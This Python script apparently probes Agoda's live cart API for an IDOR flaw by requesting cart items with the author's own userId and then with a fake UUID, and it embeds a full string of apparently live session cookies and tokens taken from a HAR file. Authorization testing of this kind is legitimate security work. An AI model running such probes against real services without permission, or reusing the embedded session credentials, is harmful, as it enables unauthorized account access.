# idor_test_proper.py
import requests
import json

# Replace with your actual cookie string from the HAR
COOKIE_STRING = """ASP.NET_SessionId=kzb4z2ggl3w4r5rkkzgbfteg; agoda.version.03=CookieId=54301675-bee8-427d-a253-4f1cf3d3b245&DLang=en-us&CurLabel=INR; deviceId=b802bd8e-4b11-4663-9d7c-a84139d1d567; agoda.price.01=PriceView=1; t_pp=vJzWP+EqOd4SlXLI:FPFT2SuvIxt/tNHj7QArTg==:A/xKLQ7UZEeFiC+1kvVAGMGT2kbiw3bwADLch+bwKVgyGjf7w09kneUIylkA+0Q+E1w5KKhtpTHqpseZcwxaotFXqtwx9xnOUbzInypjBtqZRD+cRmdRyFx/LXBCRYuAATficHtdoC2BknhVSGdlNnsjFXbaVqvGzO/WoMmqyUGOHqq+L3IcZKKGhZgzTbW9/S0Nj1wHGqFhFY1+q739F8Y/q+smxr9FHZqojs9o4gAU6sxkvko=; agoda.user.03=UserId=19ccf419-6056-4fe6-8a47-682357b35dce; agoda.prius=PriusID=0&PointsMaxTraffic=Agoda; tealiumEnable=true; _ab50group=GroupA; _40-40-20Split=Group40B; rskxRunCookie=0; rCookie=t4sp0somrhi3296iqjdb8mseeb15s; _ga=GA1.2.448405585.1785832072; _gid=GA1.2.791012109.1785832072; _gcl_au=1.2.209254719.1785832075; agoda.consent=IN||2026-08-04 09:01:46Z; utag_main=v_id:019fcbe2c1d300185b26fe5efba705065001b05d0086e$_sn:1$_se:8$_ss:0$_st:1785836240462$ses_id:1785832063449%3Bexp-session$_pn:8%3Bexp-session; lastRskxRun=1785834265035; _ga_C07L4VP9DZ=GS2.2.s1785832074$o1$g1$t1785834271$j60$l0$h0; t_rc=dD03NyZ1aWQ9MTljY2Y0MTktNjA1Ni00ZmU2LThhNDctNjgyMzU3YjM1ZGNl.Nv10YOAjrEdAXHt21n4LE1i7GTbK8XVrVgAsPo7j/yI=; agoda.analytics=Id=-465366890975571568&Signature=2786757484576472489&Expiry=1785838036593"""

OWN_USER_ID = "19ccf419-6056-4fe6-8a47-682357b35dce"  # Your actual userId
FAKE_USER_ID = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"  # Fake UUID for testing

headers = {
    'Content-Type': 'application/json',
    'Cookie': COOKIE_STRING,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
}

def test_cart(user_id, description):
    payload = {
        "context": {
            "userSettings": {"currencyCode": "INR"},
            "clientInfo": {
                "userId": user_id,
                "clientVersion": "1.0"
            }
        },
        "pagination": {"pageNumber": 1, "size": 20},
        "filter": {"status": 1, "productTypes": []}
    }
    
    print(f"\n{'='*60}")
    print(f"🔍 Testing: {description}")
    print(f"userId: {user_id}")
    print(f"{'='*60}")
    
    response = requests.post(
        'https://www.agoda.com/api/cart/items',
        headers=headers,
        json=payload,
        timeout=10
    )
    
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:500]}")
    
    if response.status_code == 200:
        try:
            data = response.json()
            print(f"✅ Cart accessible")
            # Check if data matches the requested user
            print(f"Response data: {json.dumps(data, indent=2)[:300]}")
        except:
            pass
    elif response.status_code == 403 or response.status_code == 401:
        print(f"❌ Access denied - proper authorization")
    else:
        print(f"❓ Other status: {response.status_code}")
    
    return response.status_code

# Test 1: Your own userId (should work)
status_own = test_cart(OWN_USER_ID, "OWN USER ID (should work)")

# Test 2: Fake userId (IDOR test)
status_fake = test_cart(FAKE_USER_ID, "FAKE USER ID (IDOR test)")

print(f"\n{'='*60}")
print("📊 RESULTS SUMMARY")
print(f"{'='*60}")
print(f"✅ Own userId: {status_own} - {'✅' if status_own == 200 else '❌'}")
print(f"🔐 Fake userId: {status_fake} - {'⚠️  VULNERABLE' if status_fake == 200 else '✅ Protected'}")
